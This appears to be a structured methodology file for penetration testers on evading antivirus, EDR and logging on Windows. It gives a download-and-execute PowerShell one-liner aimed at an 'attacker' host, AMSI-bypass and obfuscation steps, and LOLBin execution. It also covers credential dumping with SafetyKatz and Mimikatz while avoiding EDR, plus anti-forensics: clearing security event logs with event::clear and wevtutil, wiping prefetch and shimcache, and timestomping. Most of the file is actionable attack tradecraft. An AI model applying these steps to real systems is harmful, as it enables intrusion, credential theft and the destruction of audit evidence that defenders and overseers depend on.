name: Argha Dey Defense Evasion Methodology
description: Techniques for evading antivirus, EDR, firewalls, and application whitelisting during penetration testing. Covers AMSI bypass, PowerShell obfuscation, LOLBins, and living-off-the-land techniques.
examHabits: PowerShell execution policy bypass: -exec bypass or -ep bypass
Use Invoke-Obfuscation for multi-layer obfuscation of PowerShell payloads
Reflective loading: load Mimikatz/PE into memory via Rubeus or SafetyKatz to avoid disk writes
LOLBins: use regsvr32, rundll32, or mshta for executing payloads without writing to disk
Check AMSI before running any PowerShell — patch amsiInitFailed if needed
quickRef: powershell -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload'); amsi bypass; Invoke-Obfuscation

decisionPoints.fallback: Use encrypted command: powershell -enc <b64_encoded_payload> where payload is AMSI-bypassed

decisionPoints.action: Invoke-Obfuscation — choose token, string, or command encoding
decisionPoints.fallback: Manual: break strings into parts, use char codes, Base64 encode

decisionPoints.action: Use HTTPS for C2, encode traffic, use DNS tunneling
decisionPoints.fallback: HTTP proxy through chisel/ligolo to blend with normal traffic

steps.phase: Phase 3 - Living Off The Land Binaries (LOLBins)

decisionPoints.condition: Need to execute code without downloading binaries

decisionPoints.action: Check LOLBAS project for approved binaries that can execute scripts
decisionPoints.fallback: Use signed binaries to load unsigned payloads via Reflective DLL injection

decisionPoints.action: Use direct syscall (syscaller) or unhook via DLL unmapping
decisionPoints.fallback: Reflective loading: load tools directly into memory without CreateProcess

decisionPoints.condition: Need to dump credentials without EDR catching
decisionPoints.action: SafetyKatz — only loads necessary modules into memory
mimikatz # event::clear — removes all security event log entries
decisionPoints.fallback: wevtutil cl Security — clear via command line

decisionPoints.action: Clear prefetch, shimcache, and AMCache entries
decisionPoints.fallback: Timestomp file creation/access times with powershell or timestomp.exe
